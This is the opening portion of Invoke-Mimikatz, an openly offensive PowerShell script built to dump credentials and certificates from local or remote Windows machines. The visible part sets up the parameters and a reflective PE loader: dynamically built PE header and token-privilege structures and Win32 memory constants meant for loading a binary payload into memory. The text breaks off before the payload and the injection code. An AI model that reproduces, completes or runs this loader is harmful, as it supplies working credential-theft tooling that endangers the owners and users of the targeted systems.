function Invoke-Mimikatz
{

[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,

        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $FuncReturnType,

        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $ProcId,

        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
    )

    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
